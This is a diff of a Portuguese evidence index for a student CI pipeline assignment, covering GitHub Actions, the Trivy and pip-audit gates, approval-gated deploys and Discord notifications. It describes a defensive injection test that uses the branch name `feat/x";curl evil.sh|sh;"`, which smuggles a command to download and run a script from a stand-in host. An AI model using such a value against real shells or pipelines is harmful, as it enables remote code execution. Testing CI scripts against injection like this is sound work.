@@ -1,119 +1,148 @@
 # Evidências da entrega — Atividade 1 (CI)
 
-Índice das capturas que comprovam cada requisito do pipeline. A tabela
-*Evidências da entrega* do README principal é o resumo; este arquivo é o mapa
-completo, com o que cada imagem mostra e onde ela foi capturada.
+Capturas do pipeline de CI do grupo WJD em funcionamento, agrupadas pelo
+requisito que cada uma demonstra. A tabela *Evidências da entrega* do
+[README principal](../README.md#evidências-da-entrega) aponta para estas mesmas
+capturas a partir de cada item do enunciado.
 
-**Convenção de nome:** `evidencia_NN_assunto.png` para as numeradas,
-`extras/assunto.png` para o material de apoio que não entra na tabela.
-
----
-
-## As quinze evidências
-
-| # | Arquivo | O que mostra | Onde foi capturado | Linha da tabela | Status |
-|---|---|---|---|---|---|
-| 01 | `evidencia_01_ci_checks_verdes.png` | Os quatro checks `Required` verdes e o merge bloqueado por revisão de code owner | PR #2 → Conversation | — | ✅ |
-| 02 | `evidencia_02_matrix_paralela.png` | Os três jobs da matrix expandidos, com a duração de cada um | Actions → run #3 → grafo com *Show all jobs* | 4 | ✅ |
-| 03 | `evidencia_03_trivy_security.png` | *3 new alerts* do Trivy: os três CVEs `MEDIUM` anotados na linha 3 do `requirements.txt` | PR do ensaio (#7) → Checks → Code scanning results / Trivy | 6 | ✅ |
-| 04 | `evidencia_04_discord_sucesso.png` | Dois cards verdes: um de pull request, um de push na `main` | Discord → `#geral` | 7 | ✅ |
-| 05 | `evidencia_05_deploy_waiting.png` | Job em *Waiting*, botão *Review deployments* e a tabela *Deployment protection rules* | Actions → run #3 | 5 | ✅ |
-| 06 | `evidencia_06_deploy_aprovado.png` | Banner *The deployments have been approved* e o log do job com `Target: ***` | Actions → run #3 → job do deploy | 5 | ✅ |
-| 07 | `evidencia_07_pipeline_verde_main.png` | Os seis jobs concluídos na `main`, deploy incluído | Actions → run #3 | 1 | ✅ |
-| 08 | `evidencia_08_required_checks.png` | Ruleset salvo com os quatro checks obrigatórios e `Deploy to staging` fora da lista | Settings → Rules → `main protection` | — | ✅ |
-| 09 | `evidencia_09_cache_hit.png` | `Cache hit`, `Cache restored successfully` e a chave restaurada — 25 MB a 18,9 MB/s | PR #3 → job `test (3.11)` → step *Cache pip downloads* | 4 | ✅ |
-| 10 | `evidencia_10_badge_verde.png` | Badge `CI passing` verde no topo do README da `main` | Code → README na `main` | — | ✅ |
-| 11 | `evidencia_11_pr_corrigido_verde.png` | O mesmo PR depois do bump: alertas do Trivy marcados *Fixed* e os quatro checks *Required* verdes | PR do ensaio (#7) → Conversation | 3 | ✅ |
-| 12 | `evidencia_12_merge_bloqueado.png` | Três checks de teste vermelhos marcados *Required* e o botão de merge cinza | PR do ensaio (#7) → caixa de merge | 2 | ✅ |
-| 13 | `evidencia_13_pip_audit_cves.txt` | Os três CVEs do `requests` e as versões de correção | `pip-audit` local, mesma versão do CI — no CI o step fica *skipped* porque o Trivy reprova antes | 2 | ✅ |
-| 14 | `evidencia_14_trivy_bloqueio.png` | Step do Trivy saindo com `exit code 1`, SARIF enviado mesmo assim, `pytest` e `pip-audit` pulados | Run #12 → job `test (3.11)` | 2 | ✅ |
-| 15 | `evidencia_15_discord_falha.png` | Card vermelho do run #12 e o verde do run #13, no mesmo PR | Discord → `#geral` | 7 | ✅ |
+| # | Arquivo | O que demonstra |
+| --- | --- | --- |
+| 01 | [evidencia_01_ci_checks_verdes.png](evidencia_01_ci_checks_verdes.png) | Checks obrigatórios verdes e merge aguardando revisão de code owner |
+| 02 | [evidencia_02_matrix_paralela.png](evidencia_02_matrix_paralela.png) | As três versões de Python rodando em paralelo |
+| 03 | [evidencia_03_trivy_security.png](evidencia_03_trivy_security.png) | Alertas do Trivy no code scanning, anotados na linha alterada |
+| 04 | [evidencia_04_discord_sucesso.png](evidencia_04_discord_sucesso.png) | Notificação de sucesso, em pull request e em push na `main` |
+| 05 | [evidencia_05_deploy_waiting.png](evidencia_05_deploy_waiting.png) | Deploy pausado aguardando aprovação humana |
+| 06 | [evidencia_06_deploy_aprovado.png](evidencia_06_deploy_aprovado.png) | Deploy aprovado, com o secret de environment mascarado no log |
+| 07 | [evidencia_07_pipeline_verde_main.png](evidencia_07_pipeline_verde_main.png) | Pipeline completo verde na `main` |
+| 08 | [evidencia_08_required_checks.png](evidencia_08_required_checks.png) | Ruleset da `main` com os checks obrigatórios |
+| 09 | [evidencia_09_cache_hit.png](evidencia_09_cache_hit.png) | Cache de dependências restaurado |
+| 10 | [evidencia_10_badge_verde.png](evidencia_10_badge_verde.png) | Badge do CI verde no README |
+| 11 | [evidencia_11_pr_corrigido_verde.png](evidencia_11_pr_corrigido_verde.png) | O PR corrigido, com alertas resolvidos e checks verdes |
+| 12 | [evidencia_12_merge_bloqueado.png](evidencia_12_merge_bloqueado.png) | Merge bloqueado por checks obrigatórios vermelhos |
+| 13 | [evidencia_13_pip_audit_cves.txt](evidencia_13_pip_audit_cves.txt) | `pip-audit` reprovando a mesma dependência |
+| 14 | [evidencia_14_trivy_bloqueio.png](evidencia_14_trivy_bloqueio.png) | O step do Trivy encerrando o job com erro |
+| 15 | [evidencia_15_discord_falha.png](evidencia_15_discord_falha.png) | Notificação de falha e de recuperação |
+| — | [extras/sarif_upload_no_pr.png](extras/sarif_upload_no_pr.png) | Relatório do Trivy enviado também quando não há alerta |
+| — | [extras/injecao_neutralizada.png](extras/injecao_neutralizada.png) | Nome de branch malicioso chegando à notificação como texto |
 
 ---
 
-## Material de apoio
+## Pipeline verde na `main`
 
-Não entra na tabela do README, mas sustenta duas seções dele.
+![Run #3 na main com os seis jobs concluídos](evidencia_07_pipeline_verde_main.png)
 
-| Arquivo | O que mostra | Onde é citado |
-|---|---|---|
-| `extras/sarif_upload_no_pr.png` | O check `GitHub Advanced Security / Trivy` reportando no PR — prova que o SARIF sobe mesmo quando não há alerta | Seção do Trivy, em *Arquivo por arquivo* |
-| `extras/injecao_neutralizada.png` | Notificação disparada por uma branch chamada `x";curl evil.sh\|sh;"`, entregue como texto e não como comando | Seção de segurança, no job `notify` |
+**07 —** Run #3, disparado pelo merge do pipeline na `main`: lint, as três
+versões de Python, o deploy em staging e a notificação concluídos. O *Total
+duration* de 8m 38s é tempo de parede: inclui os minutos em que o deploy
+aguardou aprovação.
 
-**Enquadramento.** Toda captura é recortada na região que interessa: sem barra de
-tarefas, sem lista de servidores do Discord, sem painel de *Annotations*. A 02 e a
-07 saem do mesmo run — a 07 é a tela inteira, a 02 é o grafo em detalhe.
+![Badge do CI verde no topo do README](evidencia_10_badge_verde.png)
 
----
+**10 —** O badge reflete o último run da branch padrão. Ele só passa a
+responder depois que o `ci.yml` existe na `main`.
 
-## Legendas prontas
+## Proteção da `main`
 
-Texto para colar junto de cada imagem, porque print sem leitura é só print.
+![Ruleset main protection com os quatro checks obrigatórios](evidencia_08_required_checks.png)
 
-**02 — matrix paralela**
-> As três pernas levam 46 s, 45 s e 43 s: somadas, 134 s. Como rodam em paralelo,
-> o conjunto custa 46 s — e o `Lint (ruff)`, que não depende delas, roda junto em
-> 17 s. O `fail-fast: false` garante que uma versão quebrada não cancela as outras.
+**08 —** Ruleset *main protection*: os quatro checks obrigatórios pelo nome
+exato e a exigência de branch atualizada antes do merge. O
+`Deploy to staging (dummy)` fica fora da lista de propósito — ele não roda em
+pull request e, se fosse obrigatório, bloquearia todo merge.
 
-**07 — pipeline verde na main**
-> O `Total duration` de 8m 38s é tempo de parede, não de máquina: inclui os oito
-> minutos em que o `Deploy to staging` ficou parado esperando aprovação humana. A
-> soma do trabalho de CPU é de pouco mais de um minuto.
+![PR #2 com os checks obrigatórios verdes](evidencia_01_ci_checks_verdes.png)
 
-**06 — deploy aprovado**
-> A linha `Target: ***` é o secret de environment `STAGING_URL` mascarado pelo
-> runner. O valor não aparece no log nem para quem tem acesso ao repositório.
+**01 —** PR #2 com os quatro checks marcados *Required* e verdes. O merge
+continua bloqueado até a revisão de um code owner, exigida pelo `CODEOWNERS`.
 
-**03 — Trivy anotado no pull request**
-> O `upload-sarif` entrega o relatório ao code scanning, que comenta cada CVE na
-> linha do `requirements.txt` que o introduziu. O upload roda mesmo com o Trivy
-> reprovado — é o `if: always()` —, e por isso o achado aparece justamente
-> quando há o que reportar.
+## Merge bloqueado por gate de segurança
 
-**04 — os dois cards do Discord**
-> O card de cima é do pull request, o de baixo é do push na `main` depois do merge.
-> A diferença no campo `Deploy staging` — `⏭️ skipped` contra `✅ success` — mostra
-> as duas decisões do `notify` numa imagem só: o `if:` que restringe o deploy a
-> push na `main`, e o cálculo que trata `skipped` como neutro, para um pull request
-> não reportar falha.
+![PR #7 com os três jobs de teste vermelhos e o merge desabilitado](evidencia_12_merge_bloqueado.png)
 
-**09 — cache hit**
-> A chave é `Linux-pip-<versão>-<hash de requirements*.txt>`. Como o hash não mudou
-> desde o run anterior, o cache bateu: 25 MB restaurados em 2 s, em vez de baixar
-> tudo do PyPI de novo. A mesma captura mostra a ordem dos steps do reusable —
-> Trivy, upload do SARIF, pytest e pip-audit.
+**12 —** PR #7, com o `requests` rebaixado para 2.31.0. Os três jobs de teste
+reprovam, todos marcados *Required*, e o botão de merge fica desabilitado. O
+`Lint` passa: o que reprova é a dependência, não o código.
 
-**11 — PR corrigido**
-> A linha do tempo mostra o ciclo inteiro: o commit vermelho, as três anotações do
-> Trivy agora marcadas *Fixed* e o commit da correção verde. O merge continua
-> bloqueado só pela revisão de code owner — os gates automáticos liberaram.
+![Step do Trivy terminando com exit code 1](evidencia_14_trivy_bloqueio.png)
 
-**12 — merge bloqueado**
-> Os três checks de teste estão vermelhos e marcados *Required*, e o botão de
-> merge fica cinza. O `Lint` passou: o que reprova é a dependência, não o código.
+**14 —** Job `test (3.11)` do run #12. O Trivy termina com `exit code 1`, e é
+esse código que transforma o scan em gate. O upload do SARIF roda mesmo assim,
+por causa do `if: always()`; `pytest` e `pip-audit` ficam *skipped*, porque o
+job já falhou.
 
-**15 — card vermelho**
-> O mesmo card da evidência 04, agora com `❌` no gate de testes. O `Lint` verde e
-> o deploy `skipped` mostram onde está o problema antes de alguém abrir o log.
-> Logo abaixo, o card verde do run seguinte, no mesmo PR, fecha o ciclo da correção.
+**13 —** [`evidencia_13_pip_audit_cves.txt`](evidencia_13_pip_audit_cves.txt).
+Como o Trivy interrompe o job antes, o `pip-audit` não chega a rodar no CI.
+Executado localmente, com a mesma versão (2.7.3) e o mesmo `requirements.txt`,
+ele reprova os mesmos três CVEs. As versões de correção — 2.32.0, 2.32.4 e
+2.33.0 — mostram que subir só para 2.32.x não bastaria.
 
-**14 — o gate em ação**
-> `exit-code: '1'` é o que transforma o scan em gate: o step termina com
-> `Process completed with exit code 1`. O upload do SARIF, logo abaixo, roda
-> mesmo assim por causa do `if: always()`. O `pytest` e o `pip-audit` ficam
-> pulados — o primeiro gate que reprova interrompe o job.
+## Relatório do Trivy no code scanning
 
-**13 e 14 — os dois gates de segurança**
-> O `pip-audit` consulta a base de advisories do PyPI/OSV; o Trivy varre o
-> filesystem. Os dois reprovam os mesmos CVEs do `requests 2.31.0`, por caminhos
-> diferentes — e as correções apontadas são 2.32.0, 2.32.4 e 2.33.0, o que mostra
-> que subir só para 2.32.x não zeraria os três.
+![Code scanning results do Trivy com três alertas medium](evidencia_03_trivy_security.png)
 
----
+**03 —** O SARIF enviado pelo pipeline aparece no pull request como três
+alertas `MEDIUM` na linha 3 do `requirements.txt`: CVE-2024-35195,
+CVE-2024-47081 e CVE-2026-25645. A faixa de severidade do Trivy começa em
+`MEDIUM` justamente porque, com `HIGH,CRITICAL`, esses três passariam.
 
-## Antes de abrir o PR desta pasta
+![Check do Trivy sem alertas no PR #2](extras/sarif_upload_no_pr.png)
 
-- [ ] Nenhum print com token, URL de webhook, IP ou credencial visível
-- [ ] Os quinze arquivos numerados presentes, sem lacuna
-- [ ] As sete linhas da tabela do README preenchidas com link ou referência a esta pasta
-- [ ] Imagens recortadas na região que interessa — sem barra de tarefas, sem lista de servidores
+No PR #2, sem dependência vulnerável, o mesmo check reporta *No new alerts*: o
+relatório é enviado também quando não há achado.
+
+## Correção
+
+![PR #7 corrigido, com alertas resolvidos e checks verdes](evidencia_11_pr_corrigido_verde.png)
+
+**11 —** O mesmo PR #7 depois de subir o `requests` para 2.33.0: os três alertas
+marcados *Fixed* e os quatro checks obrigatórios verdes. O que ainda segura o
+merge é apenas a revisão de code owner. O PR foi fechado sem merge, porque a
+mudança líquida em relação à `main` é nula.
+
+## Matrix e cache
+
+![Grafo do run com as três versões em paralelo](evidencia_02_matrix_paralela.png)
+
+**02 —** As três versões rodam em paralelo — 46 s, 45 s e 43 s, que somariam
+134 s em série —, com o `Lint` ao lado, em 17 s. Com `fail-fast: false`, a falha
+de uma versão não cancela as outras.
+
+![Step de cache com cache hit](evidencia_09_cache_hit.png)
+
+**09 —** No run seguinte, o step de cache restaura 25 MB em 2 s. A chave inclui
+o hash de `requirements*.txt`: enquanto as dependências não mudam, nada é
+baixado de novo.
+
+## Deploy com aprovação humana
+
+![Deploy aguardando aprovação no run #3](evidencia_05_deploy_waiting.png)
+
+**05 —** O job `Deploy to staging (dummy)` pausa em *Waiting* até um revisor do
+environment `staging` aprovar, e a tabela *Deployment protection rules* registra
+o pedido.
+
+![Log do deploy aprovado com o secret mascarado](evidencia_06_deploy_aprovado.png)
+
+**06 —** Depois da aprovação, o deploy conclui. No log, `Target: ***` é o secret
+`STAGING_URL`, com escopo de environment, mascarado pelo runner.
+
+## Notificações no Discord
+
+![Dois cards verdes, de pull request e de push na main](evidencia_04_discord_sucesso.png)
+
+**04 —** Dois cards verdes: um de pull request e um de push na `main`. No
+primeiro o deploy aparece `skipped`, no segundo `success` — o `notify` trata
+`skipped` como neutro, para um pull request não ser notificado como falha.
+
+![Card vermelho do run #12 seguido do card verde do run #13](evidencia_15_discord_falha.png)
+
+**15 —** O card vermelho do run #12 aponta o gate que falhou; logo abaixo, o card
+verde do run #13, no mesmo pull request, registra a recuperação.
+
+![Card do teste de injeção com o nome de branch malicioso](extras/injecao_neutralizada.png)
+
+Teste do script do step de envio, executado localmente contra o webhook real,
+com o nome de branch `feat/x";curl evil.sh|sh;"`. O nome chegou ao Discord como
+texto: os valores entram no shell por `env:` e o JSON é montado com `jq`, então
+nada do conteúdo é interpretado como comando. Por ser um teste local, o link do
+card não aponta para um run existente.
